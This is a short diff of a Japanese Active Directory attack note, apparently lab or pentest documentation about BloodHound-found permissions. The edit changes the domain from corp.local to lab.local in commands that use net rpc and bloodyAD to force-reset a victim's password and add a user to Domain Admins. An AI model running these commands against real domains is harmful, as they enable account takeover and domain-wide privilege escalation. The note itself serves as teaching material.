@@ -28,12 +28,12 @@ BloodHound で収集したグラフ上では、これらは「侵害されたア
 
 ```
 # 対象ユーザーのパスワードを強制変更（ForceChangePassword / GenericAll）
-net rpc password 'victim' 'NewPass123!' -U corp.local/user%'Password123' -S <DC_IP>
+net rpc password 'victim' 'NewPass123!' -U lab.local/user%'Password123' -S <DC_IP>
 # またはリモートで
-bloodyAD --host <DC_IP> -d corp.local -u user -p 'Password123' set password victim 'NewPass123!'
+bloodyAD --host <DC_IP> -d lab.local -u user -p 'Password123' set password victim 'NewPass123!'
 
 # 対象グループへ自分を追加（GenericWrite/AddMember）
-bloodyAD --host <DC_IP> -d corp.local -u user -p 'Password123' add groupMember 'Domain Admins' user
+bloodyAD --host <DC_IP> -d lab.local -u user -p 'Password123' add groupMember 'Domain Admins' user
 ```
 
 ## 注意点
